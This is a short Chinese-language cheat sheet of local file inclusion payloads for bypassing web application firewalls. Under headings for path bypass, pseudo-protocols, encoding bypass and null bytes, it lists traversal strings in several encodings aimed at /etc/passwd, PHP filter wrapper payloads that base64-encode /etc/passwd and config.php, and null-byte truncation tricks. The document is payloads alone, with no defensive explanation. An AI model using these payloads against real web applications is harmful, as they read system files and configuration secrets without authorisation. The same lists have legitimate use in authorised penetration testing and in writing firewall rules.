# LFI WAF绕过

## 路径绕过

```
....//....//....//etc/passwd
..%2f..%2f..%2fetc/passwd
%2e%2e%2f%2e%2e%2f%2e%2e%2fetc/passwd
..%252f..%252f..%252fetc/passwd
```

## 伪协议

```
php://filter/convert.base64-encode/resource=/etc/passwd
php://filter/zlib.deflate/convert.base64-encode/resource=config.php
```

## 编码绕过

```
..//..//..//etc/passwd
..\/..\/..\/etc/passwd
.../.../.../etc/passwd
```

## 空字节

```
/etc/passwd%00.jpg
/etc/passwd\0.jpg
```
